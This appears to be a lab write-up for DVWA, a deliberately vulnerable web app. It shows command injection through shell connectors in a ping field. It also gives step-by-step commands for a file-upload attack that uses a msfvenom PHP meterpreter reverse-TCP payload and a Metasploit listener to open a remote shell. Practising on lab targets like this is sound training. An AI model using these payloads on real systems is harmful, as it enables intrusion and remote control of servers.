# DVWA 

---------------------------

## Command Injection

Command injection let you perform commands on the textbox that is intended for another task such in this case, ping a host.

Connectors can be used here to add a command which will run with the action (or not) that this textbox is intended for:

![image](https://github.com/ELRame/HackingTools/assets/82544416/88a0d631-49be-4e91-afee-22850eccc81c)

Other connectors u can use are: **&&** **&** **;**

With this in mind, and changing the difficulty on DVWA you can take a look at the source code to see if there is some character escaped/blacklisted:

![image](https://github.com/ELRame/HackingTools/assets/82544416/d25a3f58-8f92-40e7-98db-784ea3507280)

---------------------------------

## File Upload

File upload allows you to upload a malicious file into the dvwa directory, with a reverse meterpreter connection, you'll be able to run commands on it.

Run `````msfconsole```` and search for multi handler:

![image](https://github.com/ELRame/HackingTools/assets/82544416/5e93e9b8-42cf-445a-80c3-fb1750c094a6)

Select the number 30 with ````use 30```` (multi/handler) and set the payload as ````php/meterpreter/reverse_tcp````

![image](https://github.com/ELRame/HackingTools/assets/82544416/7e48c7ee-f1a0-4577-933c-d41c8c2290fc)

Then type ````show options`````to get the fields you need to fill, in this case LHOST, which can be set with ````set LHOST youripmachine```` that in this case is **127.0.0.1** (localhost) since we are running dvwa in the same machine

![image](https://github.com/ELRame/HackingTools/assets/82544416/dcbf1fde-19cd-404d-ae0e-bd91972b9b52)

After this you can create the payload for dvwa with **msfvenom** using the folloring command:

````
msfvenom -p php/meterpreter/reverse_tcp LHOST=youripmachine LPORT=4444 -f raw >malfile.php
````

![image](https://github.com/ELRame/HackingTools/assets/82544416/ea79972c-b9ef-4c1a-acf4-75a3adf10b85)

After this you can go to dvwa and upload the file, once uploaded, you have to go back to metasploit and run the command ````run```` or ´´´´exploit´´´´ in order to put it in listening state:

![image](https://github.com/ELRame/HackingTools/assets/82544416/9ba1a9da-0a65-46ae-b255-b11891429edd)

Now, on dvwa copy the path where the file was uploaded and put it in the url address:

![image](https://github.com/ELRame/HackingTools/assets/82544416/3eec3d74-ba1f-4f7d-ad0d-5f93f0e7a6e0)

After that, go to the url and the meterpreter session should be running:

![image](https://github.com/ELRame/HackingTools/assets/82544416/385b87cc-915d-466f-bc52-b132aec04276)

![image](https://github.com/ELRame/HackingTools/assets/82544416/cbd56dcc-72dd-4736-b78e-9e659f4a3f9e)

### Medium Difficulty

